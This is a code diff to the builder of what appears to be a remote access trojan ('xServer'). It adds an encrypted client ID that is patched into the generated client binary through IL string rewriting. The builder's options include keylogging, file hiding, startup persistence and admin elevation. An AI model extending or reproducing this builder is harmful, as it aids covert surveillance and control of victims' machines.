@@ -18,6 +18,7 @@ namespace xServer.Core.Build
         /// <param name="output">The name of the final file.</param>
         /// <param name="host">The URI location of the host.</param>
         /// <param name="password">The password that is used to connect to the website.</param>
+        /// <param name="clientId">The client ID, defaults to 'Default'.</param>
         /// <param name="installsub">The sub-folder to install the client.</param>
         /// <param name="installname">Name of the installed executable.</param>
         /// <param name="mutex">The client's mutex</param>
@@ -36,7 +37,7 @@ namespace xServer.Core.Build
         /// <exception cref="System.Exception">Thrown if the builder was unable to rename the client executable.</exception>
         /// <exception cref="System.ArgumentException">Thrown if an invalid special folder was specified.</exception>
         /// <exception cref="System.IO.FileLoadException">Thrown if the client binaries do not exist.</exception>
-        public static void Build(string output, string host, string password, string installsub, string installname,
+        public static void Build(string output, string host, string password, string clientId, string installsub, string installname,
             string mutex, string startupkey, bool install, bool startup, bool hidefile, bool keylogger, int port,
             int reconnectdelay,
             int installpath, bool adminelevation, string iconpath, string[] asminfo, string version)
@@ -65,7 +66,7 @@ namespace xServer.Core.Build
 
                             for (int i = 0; i < methodDef.Body.Instructions.Count; i++)
                             {
-                                if (methodDef.Body.Instructions[i].OpCode.Name == "ldstr") // string
+                                if (methodDef.Body.Instructions[i].OpCode == OpCodes.Ldstr) // string
                                 {
                                     switch (strings)
                                     {
@@ -93,6 +94,10 @@ namespace xServer.Core.Build
                                         case 8: //random encryption key
                                             methodDef.Body.Instructions[i].Operand = encKey;
                                             break;
+                                        case 9:
+                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(clientId, encKey);
+                                            break;
+                                        
                                     }
                                     strings++;
                                 }
